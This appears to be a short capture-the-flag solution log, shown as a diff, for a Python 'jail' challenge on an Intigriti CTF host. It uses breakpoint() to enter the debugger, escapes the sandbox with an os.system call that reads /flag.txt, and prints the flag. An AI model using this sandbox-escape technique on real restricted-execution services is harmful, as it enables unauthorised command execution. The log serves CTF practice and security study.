@@ -1,0 +1,6 @@
+% nc jail.ctf.intigriti.io 1337
+>> breakpoint()
+--Return--
+> <string>(1)<module>()->None
+(Pdb) __import__("os").system("cat /flag.txt")
+INTIGRITI{Br4ak_br4ak_Br34kp01nt_ftw}0
